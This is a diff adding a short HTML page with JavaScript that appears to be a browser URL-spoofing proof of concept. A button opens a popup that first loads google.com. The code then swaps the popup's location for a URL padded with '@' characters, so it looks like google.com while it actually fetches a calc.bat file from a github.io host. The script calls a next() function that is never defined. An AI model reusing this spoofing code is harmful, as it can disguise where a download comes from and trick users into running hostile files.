@@ -1,0 +1,13 @@
+<script>        
+        function spoof() {
+                w.location.replace('https://google.com@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@heloworld285.github.io/calc.bat');
+        }
+
+        function button() {
+                w = window.open("javascript:document.write('Hi Google Redirected To bing.com');location='https://google.com'")
+
+                i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 0);
+        }
+</script>
+
+<center><button onclick="button()">click here</button> </center>
